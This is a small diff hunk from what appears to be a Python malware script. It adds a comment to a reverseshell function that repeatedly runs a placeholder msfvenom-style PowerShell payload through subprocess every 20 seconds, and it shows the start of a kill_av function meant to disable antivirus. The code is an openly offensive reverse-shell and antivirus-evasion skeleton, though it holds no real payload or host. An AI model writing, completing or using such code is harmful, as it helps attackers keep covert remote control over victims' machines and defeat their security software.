@@ -7,7 +7,7 @@ import sys
 def reverseshell():
        while True:
               payload = "Put your Payload Here" # Example (MsfVenomPayload with Powershell)
-              time.sleep(20)
+              time.sleep(20) #Shell Every 20 Sec
               subprocess.Popen(payload.split(), shell=True).communicate()
 
 def kill_av():
